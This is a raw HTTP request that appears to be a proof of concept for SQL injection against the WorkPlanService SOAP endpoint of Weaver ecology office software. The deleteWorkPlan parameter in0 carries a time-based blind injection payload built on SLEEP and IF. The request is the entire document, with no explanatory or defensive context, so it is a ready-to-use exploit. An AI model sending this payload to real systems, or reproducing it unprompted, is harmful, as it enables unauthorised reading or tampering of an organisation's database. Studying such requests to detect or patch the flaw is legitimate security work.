```
POST /services/WorkPlanService HTTP/1.1
Host: 
Content-Length: 380
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/120.0.6367.118 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,i
mage/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
SOAPAction:
Content-Type: text/xml;charset=UTF-8
Referer: http://0.0.0.0/services/WorkPlanService
Cookie: ecology_JSessionid=bibwzto5sdeg43J9Fz0iu
Connection: close

<soapenv:Envelope
xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.workplan.weaver.com.cn">
<soapenv:Header/>
<soapenv:Body>
<web:deleteWorkPlan>
<!--type: string-->
<web:in0>(SELECT 123 FROM
(SELECT(SLEEP(3-(IF(1=1,0,5)))))NZeo)</web:in0>
<!--type: int-->
<web:in1>22</web:in1>
</web:deleteWorkPlan>
</soapenv:Body>
</soapenv:Envelope>
```

